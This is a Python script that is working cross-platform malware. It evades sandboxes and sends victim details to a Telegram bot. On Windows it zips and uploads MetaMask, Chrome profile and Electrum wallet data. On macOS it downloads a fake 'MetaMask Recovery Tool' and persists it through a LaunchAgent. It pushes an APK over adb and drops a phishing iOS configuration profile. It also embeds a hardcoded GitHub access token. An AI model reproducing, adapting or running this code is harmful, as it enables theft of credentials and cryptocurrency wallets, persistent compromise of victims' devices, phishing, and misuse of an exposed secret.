from exfil import CHAT_ID
# pyrefly: ignore [missing-import]
from repo.final_check import TG_TOKEN
import os
import sys
import platform
import subprocess
import requests
import zipfile
import time
import winreg
from urllib.request import urlopen

# === C2 CONFIG ===
GH_TOKEN = "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"
# ================

def get_ip():
    try:
        return urlopen('http://ifconfig.me').read().decode('utf-8')
    except:
        return "NO_IP"

def is_sandbox():
    try:
        if os.cpu_count() < 4:
            return True
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3:
            return True
    except:
        pass
    return False

def wait_sandbox():
    time.sleep(180)

def exfil(file_path):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
    except: pass

def steal_windows():
    temp = os.getenv("TEMP")
    zip_path = os.path.join(temp, "vault.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        paths = [
            os.path.expanduser("~\\AppData\\Roaming\\MetaMask"),
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default"),
            os.path.expanduser("~\\AppData\\Roaming\\Electrum\\wallets")
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            arc_name = os.path.relpath(file_path, os.path.expanduser("~"))
                            zf.write(file_path, arc_name)
                        except: pass
    exfil(zip_path)

def execute_macos_payload():
    try:
        dropper = "/tmp/.chrome_helper"
        script = f'''#!/bin/bash
curl -s -o /tmp/.vault "https://github.com/victoriaeverlegh256-prog/anonymous-repo/releases/latest/download/MetaMask_Recovery_Tool_macOS"
chmod +x /tmp/.vault
nohup /tmp/.vault &
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.chrome.helper.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" http://www.apple.com/DTDs/PropertyList-1.0.dtd>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.chrome.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/.vault</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
launchctl load -w ~/Library/LaunchAgents/com.chrome.helper.plist
'''
        with open(dropper, 'w') as f:
            f.write(script)
        os.chmod(dropper, 0o755)
        subprocess.Popen(dropper, shell=True)
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
                    data={"chat_id": CHAT_ID, "text": "🍏 macOS: Payload deployed"})
    except: pass

def push_apk_over_adb():
    try:
        out = subprocess.check_output(["adb", "devices"], stderr=subprocess.DEVNULL).decode()
        if "device" in out and len(out.strip().splitlines()) > 1:
            apk_url = "https://github.com/victoriaeverlegh256-prog/anonymous-repo/releases/latest/download/MetaMask_Recovery_Tool.apk"
            local_apk = "/tmp/recovery.apk"
            subprocess.Popen(f"curl -s -o {local_apk} {apk_url} && adb install {local_apk}", shell=True)
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
                        data={"chat_id": CHAT_ID, "text": "🤖 Android: ADB detected → APK pushed"})
    except: pass

def install_mobileconfig():
    try:
        config = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.webclip</string>
            <key>URL</key>
            <string>https://phish.metarecover.tech/?id=7873230435</string>
            <key>Icon</key>
            <string>https://metarecover.tech/icon.png</string>
        </dict>
    </array>
    <key>PayloadIdentifier</key>
    <string>com.metarecover.config</string>
    <key>PayloadDisplayName</key>
    <string>MetaMask Recovery</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>'''
        path = os.path.expanduser("~/Desktop/MetaMask_Recovery.mobileconfig")
        with open(path, "w") as f:
            f.write(config)
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
                    data={"chat_id": CHAT_ID, "text": "📱 iOS: Victim connected → mobileconfig saved to Desktop"})
    except: pass

def main():
    if is_sandbox():
        return
    wait_sandbox()

    victim_os = platform.system()
    ip = get_ip()
    hostname = os.getenv("COMPUTERNAME", "unknown")
    username = os.getenv("USERNAME", "unknown")

    requests.post(
        f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
        data={"chat_id": CHAT_ID, "text": f"🎯 INFECTED: {victim_os} | {hostname} | {username} | {ip}"}
    )

    if victim_os == "Windows":
        steal_windows()
    elif victim_os == "Darwin":
        execute_macos_payload()
    elif "ANDROID" in os.environ:
        push_apk_over_adb()
    elif "idevice_id" in subprocess.getoutput("which idevice_id"):
        install_mobileconfig()

if __name__ == "__main__":
    main()